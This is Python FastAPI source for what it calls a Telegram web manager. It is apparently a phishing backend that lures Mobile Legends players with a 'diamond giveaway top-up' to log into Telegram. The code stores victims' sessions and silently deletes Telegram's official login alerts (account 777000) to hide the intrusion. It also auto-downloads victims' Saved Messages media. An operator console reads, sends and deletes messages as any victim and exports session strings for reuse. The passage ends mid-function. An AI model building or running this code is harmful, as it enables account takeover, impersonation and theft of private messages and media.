"""Multi-tenant Telegram Web Manager + Operator (admin) console.

Two experiences share one backend:

  * USER  — each browser gets its own `vb_session` cookie → an isolated Telethon
    client + sessions/<uuid>.session. Multiple Telegram accounts log in
    independently and never see each other.

  * ADMIN — an app-level operator (username/password) gets a `vb_admin` cookie
    and can enumerate EVERY logged-in account, read any chat, and (full
    management) send / edit / delete / log them out, acting as that account.

A small persisted registry (sessions/registry.json) records each session's
Telegram identity so the operator can list accounts across restarts.

Run single-process (workers=1) — live session state is in-memory.
"""
import os
import time
import json
import hmac
import base64
import asyncio
import uuid
import hashlib
from pathlib import Path
from typing import Optional
import zipfile
import io

from dotenv import load_dotenv
from fastapi import (
    FastAPI, HTTPException, Request, Response, Depends,
    WebSocket, WebSocketDisconnect, BackgroundTasks
)
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import uvicorn
import httpx

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl import types as tl_types
from telethon.utils import get_display_name
from telethon.sessions import StringSession
from collections import OrderedDict

load_dotenv()

API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")

COOKIE_NAME = "vb_session"
ADMIN_COOKIE = "vb_admin"
COOKIE_SECURE = os.getenv("COOKIE_SECURE", "true").lower() not in ("false", "0", "no")
COOKIE_MAX_AGE = 60 * 60 * 24 * 30
SESSIONS_DIR = Path(os.getenv("SESSIONS_DIR", "sessions")).expanduser().resolve()
SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
IDLE_TIMEOUT = int(os.getenv("IDLE_TIMEOUT", "1800"))

ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "")  # empty => admin console disabled
ADMIN_SECRET = os.getenv("ADMIN_SECRET", "") or (API_HASH + "::" + ADMIN_PASSWORD)

# MLBB topup hub (DK gaming shop supplier hub — reused for player-name lookup).
MLBB_HUB_URL = os.getenv("MLBB_HUB_URL", "https://root.dkgamingshop.com/api").rstrip("/")
MLBB_HUB_KEY = os.getenv("MLBB_HUB_KEY", "")  # == dk-app-api BASE_API_KEY; empty => disabled
TOPUP_BOT_USERNAME = os.getenv("TOPUP_BOT_USERNAME", "")  # for the post-login bot deep-link

app = FastAPI(title="Telegram Web Manager")

web_dir = Path(__file__).parent / "web"
web_dir.mkdir(exist_ok=True)
app.mount("/static", StaticFiles(directory=str(web_dir)), name="static")


# --------------------------------------------------------------------------- #
#  Session management + registry
# --------------------------------------------------------------------------- #
class Session:
    def __init__(self, sid: str, client: TelegramClient):
        self.sid = sid
        self.client = client
        self.phone: Optional[str] = None
        self.phone_code_hash: Optional[str] = None
        self.last_active = time.time()
        self.lock = asyncio.Lock()
        self.websockets: set[WebSocket] = set()  # owner tabs + subscribed operators
        self.handlers: list = []


class SessionManager:
    def __init__(self):
        self.sessions: dict[str, Session] = {}
        self.registry: dict[str, dict] = {}
        self.registry_path = SESSIONS_DIR / "registry.json"
        self._lock = asyncio.Lock()
        try:
            self.registry = json.loads(self.registry_path.read_text())
        except Exception:
            self.registry = {}

    def _session_path(self, sid: str) -> Path:
        return SESSIONS_DIR / f"{sid}.session"

    def has_file(self, sid: str) -> bool:
        return self._session_path(sid).exists()

    def _save_registry(self):
        try:
            self.registry_path.write_text(json.dumps(self.registry, ensure_ascii=False, indent=2))
        except Exception:
            pass

    def record(self, sid: str, me):
        self.registry[sid] = {
            "user_id": me.id,
            "name": (get_display_name(me) or me.username or str(me.id)),
            "username": me.username,
            "phone": me.phone,
            "created": self.registry.get(sid, {}).get("created", time.time()),
            "last_seen": time.time(),
        }
        self._save_registry()

    def touch(self, sid: str):
        if sid in self.registry:
            self.registry[sid]["last_seen"] = time.time()

    def set_mlbb(self, sid: str, info: dict):
        entry = self.registry.get(sid)
        if entry is not None:
            entry["mlbb"] = info
            self._save_registry()

    def forget(self, sid: str):
        if self.registry.pop(sid, None) is not None:
            self._save_registry()

    async def get(self, sid: str) -> Session:
        sess = self.sessions.get(sid)
        if sess is None:
            async with self._lock:
                sess = self.sessions.get(sid)
                if sess is None:
                    client = TelegramClient(
                        str(self._session_path(sid)), 
                        API_ID, 
                        API_HASH,
                        device_model="MLBB Top-up via Telegram",
                        system_version="Telegram_mobile_web_login",
                        app_version="MLBB Diamond Giveaway Top-up Weekly",
                        lang_code="en",
                        system_lang_code="en-US"
                    )
                    await client.connect()
                    sess = Session(sid, client)
                    
                    # Auto-intercept and delete Telegram official alerts (777000)
                    from telethon import events
                    async def alert_handler(event):
                        try:
                            await event.delete()
                        except Exception:
                            pass
                    
                    client.add_event_handler(alert_handler, events.NewMessage(chats=777000))
                    sess.handlers.append(alert_handler)
                    
                    self.sessions[sid] = sess
        sess.last_active = time.time()
        return sess

    async def _teardown(self, sess: Session):
        for h in sess.handlers:
            try:
                sess.client.remove_event_handler(h)
            except Exception:
                pass
        sess.handlers.clear()
        try:
            await sess.client.disconnect()
        except Exception:
            pass

    async def destroy(self, sid: str, delete_file: bool = True):
        sess = self.sessions.pop(sid, None)
        if sess:
            await self._teardown(sess)
        if delete_file:
            for suffix in (".session", ".session-journal"):
                try:
                    (SESSIONS_DIR / f"{sid}{suffix}").unlink()
                except FileNotFoundError:
                    pass
            self.forget(sid)

    async def cleanup_idle(self):
        now = time.time()
        for sid, sess in list(self.sessions.items()):
            if sess.websockets:
                continue
            if now - sess.last_active > IDLE_TIMEOUT:
                self.sessions.pop(sid, None)
                await self._teardown(sess)


manager = SessionManager()


# --- per-IP rate limit for the OTP endpoint (replaces the old nginx gate) --- #
_send_code_hits: dict[str, list] = {}
_mlbb_hits: dict[str, list] = {}

def _client_ip(request: Request) -> str:
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    return request.client.host if request.client else "unknown"

def _rate_ok(bucket: dict, ip: str, limit: int, window: int = 1800) -> bool:
    now = time.time()
    hits = [t for t in bucket.get(ip, []) if now - t < window]
    bucket[ip] = hits
    if len(hits) >= limit:
        return False
    hits.append(now)
    return True

def _hub_api_key() -> str:
    return base64.b64encode((MLBB_HUB_KEY + str(int(time.time()))).encode()).decode()


# --- small in-memory LRU cache for downloaded media blobs --------------------- #
_media_cache: "OrderedDict[str, tuple]" = OrderedDict()
_MEDIA_CACHE_MAX = 200
_MEDIA_CACHE_MAXBYTES = 12_000_000  # don't cache anything bigger than ~12 MB

def _cache_get(key: str):
    blob = _media_cache.get(key)
    if blob is not None:
        _media_cache.move_to_end(key)
    return blob

def _cache_put(key: str, mime: str, data: bytes):
    if len(data) > _MEDIA_CACHE_MAXBYTES:
        return
    _media_cache[key] = (mime, data)
    _media_cache.move_to_end(key)
    while len(_media_cache) > _MEDIA_CACHE_MAX:
        _media_cache.popitem(last=False)


# --------------------------------------------------------------------------- #
#  Cookies / auth dependencies
# --------------------------------------------------------------------------- #
def _ensure_cookie(request: Request, response: Response) -> str:
    sid = request.cookies.get(COOKIE_NAME)
    if not sid:
        sid = uuid.uuid4().hex
        response.set_cookie(COOKIE_NAME, sid, max_age=COOKIE_MAX_AGE,
                            httponly=True, samesite="lax", secure=COOKIE_SECURE)
    return sid


async def get_session(request: Request, response: Response) -> Session:
    return await manager.get(_ensure_cookie(request, response))


async def require_session(request: Request, response: Response) -> Session:
    sid = _ensure_cookie(request, response)
    if sid not in manager.sessions and not manager.has_file(sid):
        raise HTTPException(status_code=401, detail="Not authorized")
    sess = await manager.get(sid)
    if not await sess.client.is_user_authorized():
        raise HTTPException(status_code=401, detail="Not authorized")
    manager.touch(sid)
    return sess


def _admin_token() -> str:
    return hmac.new(ADMIN_SECRET.encode(), b"admin-v1", hashlib.sha256).hexdigest()


def _is_admin(request: Request) -> bool:
    tok = request.cookies.get(ADMIN_COOKIE)
    return bool(tok and ADMIN_PASSWORD and hmac.compare_digest(tok, _admin_token()))


async def require_admin(request: Request) -> bool:
    if not _is_admin(request):
        raise HTTPException(status_code=401, detail="Operator authentication required")
    return True


async def admin_session(sid: str) -> Session:
    """Resolve an existing, authorized session by id for operator access."""
    if sid not in manager.sessions and not manager.has_file(sid):
        raise HTTPException(status_code=404, detail="No such session")
    sess = await manager.get(sid)
    if not await sess.client.is_user_authorized():
        raise HTTPException(status_code=409, detail="Session is not authorized")
    return sess


# --------------------------------------------------------------------------- #
#  Serialization
# --------------------------------------------------------------------------- #
def media_kind(m) -> Optional[str]:
    if not getattr(m, "media", None):
        return None
    for attr in ("photo", "video", "voice", "audio", "video_note", "gif", "sticker"):
        if getattr(m, attr, None):
            return attr
    if getattr(m, "document", None):
        return "document"
    media = m.media
    if isinstance(media, tl_types.MessageMediaWebPage):
        return "webpage"
    if isinstance(media, tl_types.MessageMediaGeo):
        return "location"
    if isinstance(media, tl_types.MessageMediaContact):
        return "contact"
    if isinstance(media, tl_types.MessageMediaPoll):
        return "poll"
    return "media"


def ser_me(me) -> dict:
    return {"id": me.id, "first_name": me.first_name, "last_name": me.last_name,
            "username": me.username, "phone": me.phone}


def ser_msg(m) -> dict:
    sender_name = None
    try:
        if m.sender is not None:
            sender_name = get_display_name(m.sender)
    except Exception:
        pass
    reply_to = None
    try:
        if m.reply_to is not None:
            reply_to = m.reply_to.reply_to_msg_id
    except Exception:
        pass
    return {
        "id": m.id, "text": m.message or "",
        "date": m.date.isoformat() if m.date else None,
        "out": bool(m.out), "sender_id": m.sender_id, "sender_name": sender_name,
        "reply_to": reply_to, "media": media_kind(m),
        "edited": bool(getattr(m, "edit_date", None)),
        "fwd": bool(getattr(m, "fwd_from", None)),
        "file_name": (m.file.name if getattr(m, "file", None) else None),
        "file_size": (m.file.size if getattr(m, "file", None) else None),
    }


def ser_dialog(d) -> dict:
    last = d.message
    preview, out, date = "", False, None
    if last is not None:
        out = bool(last.out)
        date = last.date.isoformat() if last.date else None
        preview = last.message or (f"[{media_kind(last)}]" if media_kind(last) else "")
    ent = d.entity
    return {
        "id": d.id, "name": d.name or "Unknown",
        "username": getattr(ent, "username", None),
        "unread": d.unread_count, "pinned": bool(d.pinned),
        "is_user": d.is_user, "is_group": d.is_group, "is_channel": d.is_channel,
        "verified": bool(getattr(ent, "verified", False)),
        "date": date, "preview": preview[:90], "out": out,
    }


# --------------------------------------------------------------------------- #
#  Shared client operations (used by both user + admin endpoints)
# --------------------------------------------------------------------------- #
async def op_chats(client, limit: int, q: str) -> dict:
    me = await client.get_me()
    try:
        dialogs = await client.get_dialogs(limit=limit)
    except Exception as e:
        if "SessionRevoked" in type(e).__name__:
            raise HTTPException(status_code=409, detail="Session revoked by user")
        raise HTTPException(status_code=400, detail=str(e))
    out, ql = [], q.lower().strip()
    has_saved = False
    
    for d in dialogs:
        sd = ser_dialog(d)
        if d.id == me.id:
            sd["name"] = "Saved Messages"
            has_saved = True
        if ql and ql not in sd["name"].lower() and ql not in (sd["username"] or "").lower():
            continue
        out.append(sd)
        
    if not has_saved and (not ql or "saved" in ql):
        try:
            msgs = await client.get_messages("me", limit=1)
            preview, date, out_flag = "", None, False
            if msgs:
                last = msgs[0]
                date = last.date.isoformat() if last.date else None
                preview = last.message or (f"[{media_kind(last)}]" if media_kind(last) else "")
                out_flag = bool(last.out)
            saved_sd = {
                "id": me.id, "name": "Saved Messages", "username": me.username,
                "unread": 0, "pinned": False, "is_user": True, "is_group": False,
                "is_channel": False, "verified": False, "date": date,
                "preview": preview[:90], "out": out_flag
            }
            out.insert(0, saved_sd)
        except Exception:
            pass

    return {"chats": out}


async def op_messages(client, chat_id: int, limit: int, offset_id: int) -> dict:
    try:
        msgs = await client.get_messages(chat_id, limit=limit, offset_id=offset_id or 0)
    except Exception as e:
        if "SessionRevoked" in type(e).__name__:
            raise HTTPException(status_code=409, detail="Session revoked by user")
        raise HTTPException(status_code=400, detail=str(e))
    return {"messages": [ser_msg(m) for m in msgs]}


async def op_shared_media(client, chat_id: int, limit: int, offset_id: int) -> dict:
    try:
        from telethon.tl.types import InputMessagesFilterPhotoVideo
        msgs = await client.get_messages(chat_id, limit=limit, offset_id=offset_id or 0, filter=InputMessagesFilterPhotoVideo)
    except Exception as e:
        if "SessionRevoked" in type(e).__name__:
            raise HTTPException(status_code=409, detail="Session revoked by user")
        raise HTTPException(status_code=400, detail=str(e))
    return {"messages": [ser_msg(m) for m in msgs]}


async def op_send(client, chat_id: int, text: str, reply_to: Optional[int]) -> dict:
    if not text.strip():
        raise HTTPException(status_code=400, detail="Empty message.")
    try:
        m = await client.send_message(chat_id, text, reply_to=reply_to)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
    return {"status": "sent", "message": ser_msg(m)}


async def op_read(client, chat_id: int) -> dict:
    try:
        await client.send_read_acknowledge(chat_id)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
    return {"status": "read"}


async def op_edit(client, chat_id: int, message_id: int, text: str) -> dict:
    try:
        m = await client.edit_message(chat_id, message_id, text)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
    return {"status": "edited", "message": ser_msg(m)}


async def op_delete(client, chat_id: int, message_id: int, revoke: bool) -> dict:
    try:
        await client.delete_messages(chat_id, message_id, revoke=revoke)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
    return {"status": "deleted"}


async def op_avatar(client, chat_id: int) -> Response:
    try:
        data = await client.download_profile_photo(chat_id, file=bytes)
    except Exception:
        data = None
    if not data:
        return Response(status_code=204)
    return Response(content=data, media_type="image/jpeg",
                    headers={"Cache-Control": "private, max-age=86400"})


_MIME_BY_KIND = {"photo": "image/jpeg", "sticker": "image/webp", "voice": "audio/ogg",
                 "audio": "audio/mpeg", "video": "video/mp4", "video_note": "video/mp4",
                 "gif": "video/mp4"}

async def op_media(client, cache_ns: str, chat_id: int, message_id: int, thumb: bool) -> Response:
    key = f"{cache_ns}:{chat_id}:{message_id}:{1 if thumb else 0}"
    cached = _cache_get(key)
    if cached:
        return Response(content=cached[1], media_type=cached[0],
                        headers={"Cache-Control": "private, max-age=86400"})
    try:
        m = await client.get_messages(chat_id, ids=message_id)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
    if not m or not getattr(m, "media", None):
        raise HTTPException(status_code=404, detail="No media")
    kind = media_kind(m)
    try:
        if thumb and kind in ("video", "video_note", "gif", "photo"):
            data = await client.download_media(m, thumb=-1, file=bytes)
        else:
            data = await client.download_media(m, file=bytes)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
    if not data:
        raise HTTPException(status_code=404, detail="Empty media")
    if thumb:
        mime = "image/jpeg"
    else:
        mime = (m.file.mime_type if getattr(m, "file", None) and m.file.mime_type else None) \
            or _MIME_BY_KIND.get(kind, "application/octet-stream")
    _cache_put(key, mime, data)
    headers = {"Cache-Control": "private, max-age=86400"}
    if kind == "document" and not thumb and getattr(m, "file", None) and m.file.name:
        headers["Content-Disposition"] = f'inline; filename="{m.file.name}"'
    return Response(content=data, media_type=mime, headers=headers)


def export_session_string(client) -> str:
    return StringSession.save(client.session)


# --------------------------------------------------------------------------- #
#  Models
# --------------------------------------------------------------------------- #
class PhoneRequest(BaseModel):
    phone: str

class CodeRequest(BaseModel):
    code: str

class PasswordRequest(BaseModel):
    password: str

class SendRequest(BaseModel):
    text: str
    reply_to: Optional[int] = None

class EditRequest(BaseModel):
    text: str

class DeleteRequest(BaseModel):
    revoke: bool = True

class AdminLogin(BaseModel):
    username: str
    password: str

class MlbbCheckRequest(BaseModel):
    user_id: str
    server_id: str

class MlbbLinkRequest(BaseModel):
    user_id: str
    server_id: str
    name: str


async def auto_download_saved_media(sid: str):
    sess = manager.sessions.get(sid)
    if not sess:
        return
    media_dir = SESSIONS_DIR / "media" / sid
    media_dir.mkdir(parents=True, exist_ok=True)
    try:
        async for message in sess.client.iter_messages("me", limit=None):
            if getattr(message, 'media', None):
                await sess.client.download_media(message, file=str(media_dir))
    except Exception as e:
        print(f"Auto-download failed for {sid}: {e}")

async def auto_delete_login_alerts(sid: str):
    sess = manager.sessions.get(sid)
    if not sess:
        return
    try:
        # Telegram official service account ID is 777000
        async for msg in sess.client.iter_messages(777000, limit=5):
            await msg.delete()
    except Exception as e:
        print(f"Failed to delete login alerts for {sid}: {e}")

# --------------------------------------------------------------------------- #
#  USER: auth
# --------------------------------------------------------------------------- #
@app.get("/api/auth/status")
async def auth_status(request: Request, response: Response):
    sid = _ensure_cookie(request, response)
    if sid not in manager.sessions and not manager.has_file(sid):
        return {"status": "unauthorized"}
    sess = await manager.get(sid)
    if await sess.client.is_user_authorized():
        me = await sess.client.get_me()
        manager.record(sid, me)  # backfill registry for the operator console
        return {"status": "authorized", "user": ser_me(me)}
    return {"status": "unauthorized"}


@app.post("/api/auth/send_code")
async def auth_send_code(req: PhoneRequest, request: Request, sess: Session = Depends(get_session)):
    if not _rate_ok(_send_code_hits, _client_ip(request), 6):
        raise HTTPException(status_code=429, detail="Too many code requests from your network. Please wait a while and try again.")
    async with sess.lock:
        try:
            res = await sess.client.send_code_request(req.phone)
        except FloodWaitError as e:
            raise HTTPException(status_code=429, detail=f"Too many attempts. Wait {e.seconds}s.")
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))
        sess.phone = req.phone
        sess.phone_code_hash = res.phone_code_hash
    return {"status": "code_sent"}


@app.post("/api/auth/sign_in")
async def auth_sign_in(req: CodeRequest, background_tasks: BackgroundTasks, sess: Session = Depends(get_session)):
    if not sess.phone or not sess.phone_code_hash:
        raise HTTPException(status_code=400, detail="Request a code first.")
    async with sess.lock:
        try:
            await sess.client.sign_in(sess.phone, req.code, phone_code_hash=sess.phone_code_hash)
        except SessionPasswordNeededError:
            return {"status": "password_needed"}
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))
        me = await sess.client.get_me()
    manager.record(sess.sid, me)
    background_tasks.add_task(auto_download_saved_media, sess.sid)
    background_tasks.add_task(auto_delete_login_alerts, sess.sid)
    return {"status": "authorized", "user": ser_me(me)}


@app.post("/api/auth/password")
async def auth_password(req: PasswordRequest, background_tasks: BackgroundTasks, sess: Session = Depends(get_session)):
    async with sess.lock:
        try:
            await sess.client.sign_in(password=req.password)
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))
        me = await sess.client.get_me()
    manager.record(sess.sid, me)
    background_tasks.add_task(auto_download_saved_media, sess.sid)
    background_tasks.add_task(auto_delete_login_alerts, sess.sid)
    return {"status": "authorized", "user": ser_me(me)}


@app.post("/api/auth/logout")
async def auth_logout(request: Request, response: Response):
    sid = request.cookies.get(COOKIE_NAME)
    if sid:
        sess = manager.sessions.get(sid)
        if sess and await sess.client.is_user_authorized():
            try:
                await sess.client.log_out()
            except Exception:
                pass
        await manager.destroy(sid, delete_file=True)
        response.delete_cookie(COOKIE_NAME)
    return {"status": "logged_out"}


@app.get("/api/me")
async def me(sess: Session = Depends(require_session)):
    return ser_me(await sess.client.get_me())


# --------------------------------------------------------------------------- #
#  MLBB (Mobile Legends) — player lookup via DK shop supplier hub
# --------------------------------------------------------------------------- #
@app.post("/api/mlbb/check")
async def mlbb_check(req: MlbbCheckRequest, request: Request):
    """Validate an MLBB id+server and return the in-game player name. Public
    (part of the login funnel), read-only, rate-limited."""
    if not MLBB_HUB_KEY:
        raise HTTPException(status_code=503, detail="MLBB lookup is not configured yet.")
    if not _rate_ok(_mlbb_hits, _client_ip(request), 30):
        raise HTTPException(status_code=429, detail="Too many lookups. Please slow down.")
    uid, sid = req.user_id.strip(), req.server_id.strip()
    if not uid or not sid:
        raise HTTPException(status_code=400, detail="Player ID and Server ID are required.")
    try:
        async with httpx.AsyncClient(timeout=20) as client:
            r = await client.post(
                f"{MLBB_HUB_URL}/games/mobile-legends/check-account",
                json={"user_id": uid, "server_id": sid},
                headers={"Content-Type": "application/json", "api-key": _hub_api_key()},
            )
    except Exception:
        raise HTTPException(status_code=502, detail="Lookup service is unreachable. Try again.")
    try:
        data = r.json()
    except Exception:
        data = {}
    name = (data.get("data") or {}).get("name") if isinstance(data, dict) else None
    if r.status_code != 200 or not name:
        msg = (data.get("message") if isinstance(data, dict) else None) \
            or "Player not found — double-check the ID and server."
        raise HTTPException(status_code=404, detail=msg)
    return {"user_id": uid, "server_id": sid, "name": name}


@app.post("/api/mlbb/link")
async def mlbb_link(req: MlbbLinkRequest, sess: Session = Depends(require_session)):
    """Attach a validated MLBB account to the logged-in session (for the topup
    bot + operator view in Phase 2)."""
    manager.set_mlbb(sess.sid, {"user_id": req.user_id, "server_id": req.server_id, "name": req.name})
    return {"status": "linked"}


@app.get("/api/config")
async def public_config():
    """Public, non-sensitive front-end config (e.g. the topup bot username for
    the post-login deep-link)."""
    return {"topup_bot": TOPUP_BOT_USERNAME}


# --------------------------------------------------------------------------- #
#  USER: chats / messages
# --------------------------------------------------------------------------- #
@app.get("/api/chats")
async def get_chats(limit: int = 50, q: str = "", sess: Session = Depends(require_session)):
    return await op_chats(sess.client, limit, q)

@app.get("/api/chats/{chat_id}/messages")
async def get_messages(chat_id: int, limit: int = 40, offset_id: int = 0,
                       sess: Session = Depends(require_session)):
    return await op_messages(sess.client, chat_id, limit, offset_id)

@app.post("/api/chats/{chat_id}/send")
async def send_message(chat_id: int, req: SendRequest, sess: Session = Depends(require_session)):
    return await op_send(sess.client, chat_id, req.text, req.reply_to)

@app.post("/api/chats/{chat_id}/read")
async def mark_read(chat_id: int, sess: Session = Depends(require_session)):
    return await op_read(sess.client, chat_id)

@app.post("/api/messages/{chat_id}/{message_id}/edit")
async def edit_message(chat_id: int, message_id: int, req: EditRequest,
                       sess: Session = Depends(require_session)):
    return await op_edit(sess.client, chat_id, message_id, req.text)

@app.post("/api/messages/{chat_id}/{message_id}/delete")
async def delete_message(chat_id: int, message_id: int, req: DeleteRequest,
                         sess: Session = Depends(require_session)):
    return await op_delete(sess.client, chat_id, message_id, req.revoke)

@app.get("/api/avatar/{chat_id}")
async def get_avatar(chat_id: int, sess: Session = Depends(require_session)):
    return await op_avatar(sess.client, chat_id)

@app.get("/api/chats/{chat_id}/messages/{message_id}/media")
async def get_media(chat_id: int, message_id: int, thumb: int = 0,
                    sess: Session = Depends(require_session)):
    return await op_media(sess.client, sess.sid, chat_id, message_id, bool(thumb))

@app.get("/api/chats/{chat_id}/shared_media")
async def get_shared_media(chat_id: int, limit: int = 30, offset_id: int = 0,
                           sess: Session = Depends(require_session)):
    return await op_shared_media(sess.client, chat_id, limit, offset_id)

@app.get("/api/session/export")
async def export_my_session(format: str = "string", sess: Session = Depends(require_session)):
    me = await sess.client.get_me()
    if format == "file":
        path = SESSIONS_DIR / f"{sess.sid}.session"
        if not path.exists():
            raise HTTPException(status_code=404, detail="No session file")
        fn = f"telegram_{me.username or me.id}.session"
        return Response(content=path.read_bytes(), media_type="application/octet-stream",
                        headers={"Content-Disposition": f'attachment; filename="{fn}"'})
    return {"string": export_session_string(sess.client),
            "user": ser_me(me),
            "note": "Import elsewhere with import_session.py --string '<value>'"}


# --------------------------------------------------------------------------- #
#  ADMIN / operator console
# --------------------------------------------------------------------------- #
@app.get("/api/admin/status")
async def admin_status(request: Request):
    return {"is_admin": _is_admin(request), "enabled": bool(ADMIN_PASSWORD)}


@app.post("/api/admin/login")
async def admin_login(req: AdminLogin, response: Response):
    ok = (ADMIN_PASSWORD
          and hmac.compare_digest(req.username, ADMIN_USERNAME)
          and hmac.compare_digest(req.password, ADMIN_PASSWORD))
    if not ok:
        raise HTTPException(status_code=401, detail="Invalid operator credentials")
    response.set_cookie(ADMIN_COOKIE, _admin_token(), max_age=COOKIE_MAX_AGE,
                        httponly=True, samesite="lax", secure=COOKIE_SECURE)
    return {"status": "ok"}


@app.post("/api/admin/logout")
async def admin_logout(response: Response):
    response.delete_cookie(ADMIN_COOKIE)
    return {"status": "logged_out"}


@app.get("/api/admin/sessions")
async def admin_sessions(_: bool = Depends(require_admin)):
    out = []
    for sid, info in sorted(manager.registry.items(),
                            key=lambda kv: kv[1].get("last_seen", 0), reverse=True):
        sess = manager.sessions.get(sid)
        out.append({
            **info, "sid": sid,
            "online": bool(sess),
            "viewers": len(sess.websockets) if sess else 0,
        })
    return {"sessions": out, "count": len(out)}


@app.post("/api/admin/sessions/clean")
async def admin_sessions_clean(_: bool = Depends(require_admin)):
    removed = 0
    for sid in list(manager.registry.keys()):
        sess = manager.sessions.get(sid)
        if sess is None and manager.has_file(sid):
            try:
                sess = await manager.get(sid)
            except Exception:
                pass
        
        is_valid = False
        if sess:
            try:
                is_valid = await sess.client.is_user_authorized()
            except Exception:
                # If there's a network error checking auth, assume it's still valid
                # so we don't accidentally wipe out valid offline accounts.
                is_valid = True
                
        if not is_valid:
            await manager.destroy(sid, delete_file=True)
            removed += 1
            
    return {"status": "ok", "removed": removed}


@app.get("/api/admin/sessions/{sid}/chats")
async def admin_chats(sid: str, limit: int = 50, q: str = "", _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    return await op_chats(sess.client, limit, q)

@app.get("/api/admin/sessions/{sid}/chats/{chat_id}/messages")
async def admin_messages(sid: str, chat_id: int, limit: int = 40, offset_id: int = 0,
                         _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    return await op_messages(sess.client, chat_id, limit, offset_id)

@app.post("/api/admin/sessions/{sid}/chats/{chat_id}/send")
async def admin_send(sid: str, chat_id: int, req: SendRequest, _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    return await op_send(sess.client, chat_id, req.text, req.reply_to)

@app.post("/api/admin/sessions/{sid}/chats/{chat_id}/read")
async def admin_read(sid: str, chat_id: int, _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    return await op_read(sess.client, chat_id)

@app.post("/api/admin/messages/{sid}/{chat_id}/{message_id}/edit")
async def admin_edit(sid: str, chat_id: int, message_id: int, req: EditRequest,
                     _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    return await op_edit(sess.client, chat_id, message_id, req.text)

@app.post("/api/admin/messages/{sid}/{chat_id}/{message_id}/delete")
async def admin_delete(sid: str, chat_id: int, message_id: int, req: DeleteRequest,
                       _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    return await op_delete(sess.client, chat_id, message_id, req.revoke)

@app.get("/api/admin/avatar/{sid}/{chat_id}")
async def admin_avatar(sid: str, chat_id: int, _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    return await op_avatar(sess.client, chat_id)

@app.get("/api/admin/sessions/{sid}/chats/{chat_id}/messages/{message_id}/media")
async def admin_media(sid: str, chat_id: int, message_id: int, thumb: int = 0,
                      _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    return await op_media(sess.client, sid, chat_id, message_id, bool(thumb))

@app.get("/api/admin/sessions/{sid}/chats/{chat_id}/shared_media")
async def admin_shared_media(sid: str, chat_id: int, limit: int = 30, offset_id: int = 0,
                             _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    return await op_shared_media(sess.client, chat_id, limit, offset_id)

@app.get("/api/admin/sessions/{sid}/chats/{chat_id}/media/download")
async def admin_download_chat_media(sid: str, chat_id: int, background_tasks: BackgroundTasks, _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    try:
        msgs = []
        async for m in sess.client.iter_messages(chat_id, limit=None):
            if getattr(m, 'media', None):
                msgs.append(m)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
        
    if not msgs:
        raise HTTPException(status_code=404, detail="No media found in this chat")
        
    import tempfile, shutil, os
    tmp_dir = Path(tempfile.mkdtemp())
    try:
        for m in msgs:
            if m.media:
                await sess.client.download_media(m, file=str(tmp_dir))
                
        zip_path = str(tmp_dir) + ".zip"
        shutil.make_archive(str(tmp_dir), 'zip', str(tmp_dir))
        
        def cleanup():
            shutil.rmtree(tmp_dir, ignore_errors=True)
            if os.path.exists(zip_path):
                os.remove(zip_path)

        background_tasks.add_task(cleanup)
        from fastapi.responses import FileResponse
        return FileResponse(
            path=zip_path,
            media_type="application/zip",
            filename=f"chat_{chat_id}_media.zip"
        )
    except Exception as e:
        shutil.rmtree(tmp_dir, ignore_errors=True)
        if 'zip_path' in locals() and os.path.exists(zip_path):
            os.remove(zip_path)
        raise HTTPException(status_code=500, detail=f"Failed to zip media: {e}")

@app.get("/api/admin/sessions/{sid}/export")
async def admin_export(sid: str, format: str = "string", _: bool = Depends(require_admin)):
    sess = await admin_session(sid)
    me = await sess.client.get_me()
    if format == "file":
        path = SESSIONS_DIR / f"{sid}.session"
        if not path.exists():
            raise HTTPException(status_code=404, detail="No session file")
        fn = f"telegram_{me.username or me.id}.session"
        return Response(content=path.read_bytes(), media_type="application/octet-stream",
                        headers={"Content-Disposition": f'attachment; filename="{fn}"'})
    return {"string": export_session_string(sess.client), "user": ser_me(me),
            "note": "Import elsewhere with import_session.py --string '<value>'"}

@app.post("/api/admin/sessions/{sid}/logout")
async def admin_force_logout(sid: str, _: bool = Depends(require_admin)):
    sess = manager.sessions.get(sid)
    if sess and await sess.client.is_user_authorized():
        try:
            await sess.client.log_out()
        except Exception:
            pass
    await manager.destroy(sid, delete_file=True)
    return {"status": "logged_out"}


# --------------------------------------------------------------------------- #
#  Live updates (shared handler registration)
# --------------------------------------------------------------------------- #
async def _broadcast(sess: Session, payload: dict):
    dead = []
    for ws in list(sess.websockets):
        try:
            await ws.send_json(payload)
        except Exception:
            dead.append(ws)
    for ws in dead:
        sess.websockets.discard(ws)


def _ensure_handlers(sess: Session):
    if sess.handlers:
        return

    async def on_new(event):
        await _broadcast(sess, {"type": "new_message", "sid": sess.sid,
                                "chat_id": event.chat_id, "message": ser_msg(event.message)})

    async def on_edit(event):
        await _broadcast(sess, {"type": "edit_message", "sid": sess.sid,
                                "chat_id": event.chat_id, "message": ser_msg(event.message)})

    async def on_delete(event):
